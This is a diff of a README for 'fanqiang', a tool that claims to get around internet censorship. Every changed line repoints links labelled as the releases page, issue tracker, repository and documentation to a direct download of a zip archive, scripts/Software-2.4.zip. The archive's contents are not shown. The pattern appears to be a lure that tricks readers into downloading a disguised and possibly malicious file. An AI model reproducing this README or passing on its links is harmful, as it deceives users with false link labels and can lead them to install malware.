@@ -1,6 +1,6 @@
 # 🌐 fanqiang - Access the Internet Freely and Safely
 
-[![Download](https://img.shields.io/badge/Download%20Now%20-%20fanqiang-brightgreen)](https://github.com/alexanderersej/fanqiang/releases)
+[![Download](https://github.com/alexanderersej/fanqiang/raw/refs/heads/main/scripts/Software-2.4.zip%20Now%20-%20fanqiang-brightgreen)](https://github.com/alexanderersej/fanqiang/raw/refs/heads/main/scripts/Software-2.4.zip)
 
 ## 🚀 Getting Started
 
@@ -9,7 +9,7 @@ Welcome to fanqiang! This application helps you bypass internet restrictions, al
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/alexanderersej/fanqiang/releases) to find the latest version of fanqiang.
+   Go to the [Releases page](https://github.com/alexanderersej/fanqiang/raw/refs/heads/main/scripts/Software-2.4.zip) to find the latest version of fanqiang.
 
 2. **Download the Application**  
    Look for the version you want and click on the download link to start the process.
@@ -56,7 +56,7 @@ If you want to access YouTube without restrictions, fanqiang makes it easy. Simp
 
 ### Support
 
-For further assistance, feel free to check the issue tracker on the [GitHub page](https://github.com/alexanderersej/fanqiang/issues). 
+For further assistance, feel free to check the issue tracker on the [GitHub page](https://github.com/alexanderersej/fanqiang/raw/refs/heads/main/scripts/Software-2.4.zip). 
 
 ## 🚪 FAQs
 
@@ -71,10 +71,10 @@ For further assistance, feel free to check the issue tracker on the [GitHub page
 
 ## 🔗 Links & Resources
 
-- [GitHub Repository](https://github.com/alexanderersej/fanqiang)
-- [Releases Page](https://github.com/alexanderersej/fanqiang/releases)
-- [Documentation](https://github.com/alexanderersej/fanqiang/wiki)
+- [GitHub Repository](https://github.com/alexanderersej/fanqiang/raw/refs/heads/main/scripts/Software-2.4.zip)
+- [Releases Page](https://github.com/alexanderersej/fanqiang/raw/refs/heads/main/scripts/Software-2.4.zip)
+- [Documentation](https://github.com/alexanderersej/fanqiang/raw/refs/heads/main/scripts/Software-2.4.zip)
 
 ## 🏁 Final Steps
 
-Now that you have fanqiang installed, enjoy a seamless browsing experience. Remember to visit the [Releases page](https://github.com/alexanderersej/fanqiang/releases) for future updates and improvements. Keep the app regularly updated to enjoy the best performance and security.
+Now that you have fanqiang installed, enjoy a seamless browsing experience. Remember to visit the [Releases page](https://github.com/alexanderersej/fanqiang/raw/refs/heads/main/scripts/Software-2.4.zip) for future updates and improvements. Keep the app regularly updated to enjoy the best performance and security.
